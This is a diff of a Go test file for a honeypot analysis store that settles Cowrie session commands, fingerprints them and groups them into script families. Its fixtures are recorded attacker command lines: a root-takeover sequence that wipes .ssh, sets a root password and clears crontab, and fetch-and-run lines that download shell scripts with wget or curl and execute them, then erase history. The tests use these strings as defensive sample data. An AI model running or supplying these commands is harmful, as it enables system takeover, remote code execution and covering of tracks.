@@ -185,6 +185,67 @@ func TestSettleWaitsForIngestIdle(t *testing.T) {
 	}
 }
 
+// The event-time gate on its own: ingest has been idle for hours (updated_at
+// old), but the session's last command is only 5 minutes old, so it is not
+// settled against a 10-minute idle cut.
+func TestSettleWaitsForEventIdle(t *testing.T) {
+	s := newTestStore(t, "settle-event-idle.db")
+	ctx := context.Background()
+	now := time.Now().UTC()
+	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-5*time.Minute))
+	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := s.db.Exec(`UPDATE session_scripts SET updated_at=? WHERE session_id='s1'`, formatFixedUTC(now.Add(-2*time.Hour))); err != nil {
+		t.Fatal(err)
+	}
+	if n, err := s.SettleSessionScripts(ctx, now.Add(-10*time.Minute), 100); err != nil || n != 0 {
+		t.Fatalf("settled a session whose last command is not idle: %d %v", n, err)
+	}
+	if n, err := s.SettleSessionScripts(ctx, now, 100); err != nil || n != 1 {
+		t.Fatalf("settle once event-idle: %d %v", n, err)
+	}
+}
+
+// A line recorded between settle's read and its write (updated_at moves)
+// makes the guarded UPDATE skip that session this pass: no fingerprint and no
+// scripts row from the stale lines. The next pass settles the whole session.
+func TestSettleSkipsSessionChangedBeforeWrite(t *testing.T) {
+	s := newTestStore(t, "settle-guard.db")
+	ctx := context.Background()
+	now := time.Now().UTC()
+	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-time.Hour))
+	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
+		t.Fatal(err)
+	}
+	settleBeforeWrite = func() {
+		cowrieEvent(t, s, "s1", "cowrie:a", "command", "crontab -r", "", "", now.Add(-50*time.Minute))
+		if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
+			t.Error(err)
+		}
+	}
+	t.Cleanup(func() { settleBeforeWrite = nil })
+	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 0 {
+		t.Fatalf("stale settle wrote: %d %v", n, err)
+	}
+	var fp string
+	var scripts int
+	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp)
+	s.db.QueryRow(`SELECT COUNT(*) FROM scripts`).Scan(&scripts)
+	if fp != "" || scripts != 0 {
+		t.Fatalf("fingerprint %q, %d scripts rows from the stale read", fp, scripts)
+	}
+	settleBeforeWrite = nil
+	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 1 {
+		t.Fatalf("next pass: %d %v", n, err)
+	}
+	var cmds int
+	s.db.QueryRow(`SELECT command_count FROM scripts`).Scan(&cmds)
+	if want := script.CommandCount(script.Split(script.Join([]string{script.EncodeLine(injector), script.EncodeLine("crontab -r")}))); cmds != want {
+		t.Fatalf("settled %d commands, want the whole session's %d", cmds, want)
+	}
+}
+
 const familyBase = `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\nAbc123xyz789\nAbc123xyz789" | passwd && crontab -r`
 
 // seedFamilyScripts settles one session per command script.
@@ -277,29 +338,39 @@ func TestFamilyPassBudgetResumesToSameFamilies(t *testing.T) {
 	}
 }
 
+// A representative outside the length band is never loaded, while a control
+// representative inside it is: the control shows the observation works, so
+// an empty "loaded" list cannot pass just because nothing was observed.
 func TestFamilyPassSkipsRepsOutsideLengthBand(t *testing.T) {
 	s := newTestStore(t, "families-band.db")
 	ctx := context.Background()
+	short := "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh"
 	long := familyBase + " && " + strings.Repeat("rm -rf /tmp/x && ", 20) + "history -c"
-	seedFamilyScripts(t, s, []string{long})
+	control := "cd /var/run; curl -O http://198.51.100.8/bins.sh; sh bins.sh; history -c; echo ok"
+	fp := func(cmd string) string { return script.Fingerprint(script.Join([]string{script.EncodeLine(cmd)})) }
+	seedFamilyScripts(t, s, []string{long, control})
 	if _, err := s.AssignScriptFamilies(ctx, 500); err != nil {
 		t.Fatal(err)
 	}
-	var longFP string
-	var longTC int
-	s.db.QueryRow(`SELECT fingerprint, token_count FROM scripts`).Scan(&longFP, &longTC)
+	fam := scriptFamilies(t, s)
+	if fam[fp(long)] != fp(long) || fam[fp(control)] != fp(control) {
+		t.Fatalf("precondition: long and control must be representatives: %v", fam)
+	}
+	tc := func(f string) int {
+		var n int
+		s.db.QueryRow(`SELECT token_count FROM scripts WHERE fingerprint=?`, f).Scan(&n)
+		return n
+	}
 
-	cowrieEvent(t, s, "short", "cowrie:short", "command", "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh", "", "", time.Now().UTC().Add(-time.Hour))
+	cowrieEvent(t, s, "short", "cowrie:short", "command", short, "", "", time.Now().UTC().Add(-time.Hour))
 	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
 		t.Fatal(err)
 	}
 	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
 		t.Fatal(err)
 	}
-	var shortTC int
-	s.db.QueryRow(`SELECT token_count FROM scripts WHERE fingerprint<>?`, longFP).Scan(&shortTC)
-	if shortTC == 0 || float64(shortTC)/float64(longTC) >= 0.8 {
-		t.Fatalf("precondition: token counts %d vs %d not outside the band", shortTC, longTC)
+	if !script.InLengthBand(tc(fp(short)), tc(fp(control))) || script.InLengthBand(tc(fp(short)), tc(fp(long))) {
+		t.Fatalf("precondition: token counts short %d, control %d (in band), long %d (outside)", tc(fp(short)), tc(fp(control)), tc(fp(long)))
 	}
 	var loaded []string
 	familyRepLoaded = func(fp string) { loaded = append(loaded, fp) }
@@ -307,8 +378,8 @@ func TestFamilyPassSkipsRepsOutsideLengthBand(t *testing.T) {
 	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 1 {
 		t.Fatalf("assign: %d %v", n, err)
 	}
-	if len(loaded) != 0 {
-		t.Fatalf("loaded representatives outside the length band: %v", loaded)
+	if len(loaded) != 1 || loaded[0] != fp(control) {
+		t.Fatalf("loaded %v, want only the in-band control %s", loaded, fp(control))
 	}
 }
 
